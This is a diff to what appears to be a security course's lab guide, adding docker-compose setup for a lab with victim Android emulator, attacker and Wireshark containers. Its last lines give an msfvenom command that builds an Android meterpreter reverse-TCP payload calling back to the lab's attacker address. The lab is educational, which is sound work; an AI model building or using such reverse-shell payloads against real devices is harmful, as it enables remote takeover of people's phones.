@@ -119,6 +119,31 @@ $ docker run -it -v /path/to/host-volume:/path/to/container-volume yangzhou301/l
 
 in which `-it` (`--interactive + --tty`) takes you directly inside of the container in an activative way, `-v` stands for [volume](https://docs.docker.com/storage/volumes/#populate-a-volume-using-a-container) that creates a mapping storage from the host to the container.
 
+Then, install `docker-compose` as the [instruction](https://docs.docker.com/compose/install/):
+
+Download the stable release of Docker Compose:
+
+```
+$ sudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+```
+
+Apply executable permissions to it:
+
+```
+$ sudo chmod +x /usr/local/bin/docker-compose
+```
+
+Create a symbolic link to `/usr/bin`
+
+```
+$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
+```
+
+Test if it is installed successfully:
+
+```
+$ docker-compose --version
+```
 `````
 
 ## Common Docker Commands
@@ -186,19 +211,37 @@ $ docker run -it --volume=<your-path>:/usr/src/app yangzhou301/lab4
 
 ### Lab 7
 
-In this lab, we need to run 2 machines (victim and attack), So we use `docker-compose`
+In this lab, it contains three containers`docker-compose`
 
 - Compose File: {Download}`lab7/docker-compose.yml`
-- Dockerfile(Attacker): `lab7/Dockerfile`
+- Dockerfile(Attacker): {Download}`lab7/Dockerfile`
 - Remote(Attacker):  [yangzhou301/lab7](https://hub.docker.com/repository/docker/yangzhou301/lab7)
 - Command
-
+  - Start Docker Compose:
 ```sh
 # work in lab7 directory
 $ cd lab7
 $ docker-compose up -d
+
+# or any directory that includes the `docker-compose.yml`
+$ docker-compose up -d -f docker-compose.yml
 ```
+ - Manipulate the Android Emulator (victim container `10.9.0.6`) on [http://localhost:6080](http://localhost:6080)
+ - Monitor the traffic in the subnet via Wireshark (analyzer container `10.9.0.8`) on [http://localhost:3000](http://localhost:3000/)
+ - Open a shell in the attacker container (`10.9.0.7`) to process the lab
 
 ```
-$ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.7 LPORT=4444 -f raw -o reverse_tcp.apk
+$ docker exec -it attacker /bin/bash
+```
+ - When all jobs done, terminate all containers by
+
+```
+$ docker-compose down
+```
+
+Accordingly, change the IP address used in lab instruction, for example:
+
+```
+msf> msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.7 LPORT=4444 -f raw -o reverse_tcp.apk
+msf> set lhost 10.9.0.7
 ```
